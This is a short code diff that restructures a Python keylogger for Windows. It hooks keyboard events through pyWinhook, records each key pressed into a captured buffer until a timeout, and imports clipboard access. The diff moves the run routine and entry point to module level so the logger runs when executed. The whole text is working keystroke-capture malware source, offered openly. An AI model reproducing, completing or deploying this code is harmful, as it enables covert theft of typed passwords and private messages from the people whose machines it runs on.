@@ -4,6 +4,7 @@ from io import StringIO
 import os
 import pythoncom
 import pyWinhook as pyHook
+#import pynput
 import sys
 import time
 import win32clipboard
@@ -50,20 +51,19 @@ class KeyLogger:
                 print(f'{event.Key}')
         return True
 
-    def run():
-        save_stdout = sys.stdout
-        sys.stdout = StringIO()
+def run():
+    save_stdout = sys.stdout
+    sys.stdout = StringIO()
 
-        key_logger = KeyLogger()
-        hm = pyHook.HookManager()
-        hm.KeyDown = key_logger.mykeystroke
-        hm.HookKeyboard()
-        while time.thread_time() < TIMEOUT:
-            pythoncom.PumpWaitingMessages()   
-        log = sys.stdout.getvalue()
-        sys.stdout = save_stdout
-        return log
-
-    if __name__ == '__main__':
-        print(run())
-        print('Done.')
+    kl = KeyLogger()
+    hm = pyHook.HookManager()
+    hm.KeyDown = kl.mykeystroke
+    hm.HookKeyboard()
+    while time.thread_time() < TIMEOUT:
+        pythoncom.PumpWaitingMessages()   
+    log = sys.stdout.getvalue()
+    sys.stdout = save_stdout
+    return log
+if __name__ == '__main__':
+    print(run())
+    print('Done.')
